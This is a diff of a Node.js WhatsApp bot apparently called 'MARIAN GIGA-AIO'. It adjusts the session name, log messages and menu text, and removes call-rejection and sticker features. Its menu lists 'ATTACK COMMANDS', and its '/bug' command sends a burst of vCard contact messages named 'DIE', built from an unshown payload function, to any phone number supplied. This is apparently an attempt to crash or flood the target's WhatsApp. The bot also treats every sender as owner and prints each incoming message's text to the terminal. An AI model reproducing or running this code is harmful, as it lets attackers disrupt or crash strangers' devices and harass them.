@@ -28,7 +28,7 @@ const moment = require('moment-timezone')
 
 // ==================== [ CONFIGURATION ] ====================
 
-const owner = ["601121811615"] // Nomor kamu
+const owner = ["601121811615"] 
 const prefix = "/"
 if (!fs.existsSync('./database.json')) fs.writeFileSync('./database.json', '[]')
 
@@ -65,12 +65,13 @@ async function startMarianReborn() {
     console.log(chalk.red.bold(`
     ╔══════════════════════════════════════════════════╗
     ║  ⚡ MARIAN GIGA-AIO v7.0 [REBORN] ONLINE ⚡      ║
-    ║  Status: Anti-Crash Fixed | AI: Disabled         ║
+    ║  Status: Stable Session | Mode: Anti-Crash       ║
     ║  Developer: Kean | Owner: ${owner[0]}           ║
     ╚══════════════════════════════════════════════════╝
     `))
 
-    const { state, saveCreds } = await useMultiFileAuthState("sessions_marian_pro")
+    // GANTI IDENTITAS SESI BIAR GAK LOOPING
+    const { state, saveCreds } = await useMultiFileAuthState("marian_stable_session")
     const { version } = await fetchLatestBaileysVersion()
 
     const sock = makeWASocket({
@@ -93,7 +94,7 @@ async function startMarianReborn() {
             await delay(3000)
             try {
                 let code = await sock.requestPairingCode(nr.replace(/[^0-9]/g, ''))
-                console.log(chalk.black.bgWhite(`\n KODE PAIRING: ${code} \n`))
+                console.log(chalk.black.bgWhite(`\n KODE PAIRING ANDA: ${code} \n`))
             } catch (err) {
                 console.log(chalk.red("\n[!] Gagal minta kode. Ulangi node index.js"))
             }
@@ -109,13 +110,8 @@ async function startMarianReborn() {
             const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
             if (reason !== DisconnectReason.loggedOut) startMarianReborn()
         } else if (connection === "open") {
-            console.log(chalk.green.bold("\n[✓] MARIAN REBORN CONNECTED!"))
+            console.log(chalk.green.bold("\n[✓] MARIAN STABLE CONNECTED!"))
         }
-    })
-
-    sock.ev.on('call', async (node) => {
-        const { from, id, status } = node[0]
-        if (status === 'offer') await sock.rejectCall(id, from)
     })
 
     sock.ev.on("messages.upsert", async ({ messages }) => {
@@ -127,26 +123,25 @@ async function startMarianReborn() {
 
             const type = getContentType(m.message)
             
-            // --- PEMBACA PESAN ANTI-CRASH PROTECTOR ---
+            // --- PEMBACA PESAN ANTI-CRASH (FINAL) ---
             let body = (type === 'conversation') ? m.message.conversation : 
                        (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
                        (type === 'imageMessage') ? m.message.imageMessage.caption : 
                        (type === 'videoMessage') ? m.message.videoMessage.caption : ''
 
-            // PELINDUNG: Pastikan body adalah string sebelum di-trim
             const budy = (typeof body === 'string') ? body.trim() : ''
             
-            // LOGGER DEBUG
-            console.log(chalk.yellow(`[LOG] From: ${from.split('@')[0]} | Isi: ${budy}`))
+            // LOGGER UNTUK KEAN CEK DI TERMINAL
+            if (budy) console.log(chalk.yellow(`[PESAN] From: ${from.split('@')[0]} | Isi: ${budy}`))
 
+            const isOwner = true 
             const args = budy.split(/ +/)
             const command = args[0].toLowerCase()
             const text = args.slice(1).join(" ")
-            const isOwner = true 
 
-            // LOGIKA MENU RESPONSIVE
+            // RESPONSIVE MENU
             if (command === '/menu' || command === 'menu' || command === '/help') {
-                const menu = `*⚡ MARIAN GIGA-AIO [REBORN] ⚡*
+                const menu = `*⚡ MARIAN GIGA-AIO [STABLE] ⚡*
 
 *⚔️ ATTACK COMMANDS:*
 • /bug [nomor] - VCard Storm
@@ -161,9 +156,9 @@ async function startMarianReborn() {
 • /ping - Cek speed
 • /restart - Reboot engine
 
-_Status: Anti-Crash Active_`
+_Status: Anti-Crash & Stable Active_`
                 await sock.sendMessage(from, { text: menu }, { quoted: m })
-                console.log(chalk.green(`[✓] Menu terkirim ke ${from}`))
+                console.log(chalk.green(`[✓] Berhasil membalas ke ${from}`))
                 return
             }
 
@@ -178,23 +173,11 @@ _Status: Anti-Crash Active_`
                 case 'bug':
                     let target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                     await sock.sendMessage(from, { text: "💀 Executing..." })
-                    for (let i = 0; i < 20; i++) {
+                    for (let i = 0; i < 15; i++) {
                         await sock.sendMessage(target, { 
                             contacts: { displayName: "DIE", contacts: [{ vcard: payloads.vcard(target.split('@')[0]) }] }
                         })
                     }
-                    break;
-
-                case 's':
-                case 'sticker':
-                    const quoted = m.message[type]?.contextInfo?.quotedMessage || null
-                    const isImg = type === 'imageMessage' || (quoted && getContentType(quoted) === 'imageMessage')
-                    if (!isImg) return
-                    const stream = await downloadContentFromMessage(m.message.imageMessage || quoted.imageMessage, 'image')
-                    let buff = Buffer.from([])
-                    for await (const chunk of stream) buff = Buffer.concat([buff, chunk])
-                    const webp = await imageToWebp(buff)
-                    await sock.sendMessage(from, { sticker: webp }, { quoted: m })
                     break;
 
                 case 'restart':
@@ -202,9 +185,10 @@ _Status: Anti-Crash Active_`
                     break;
             }
         } catch (e) { 
-            console.log(chalk.red("⚠️ ERROR LOG: "), e.message) 
+            console.log(chalk.red("⚠️ ERROR: "), e.message) 
         }
     })
 }
 
 startMarianReborn().catch(err => console.log(err))
+
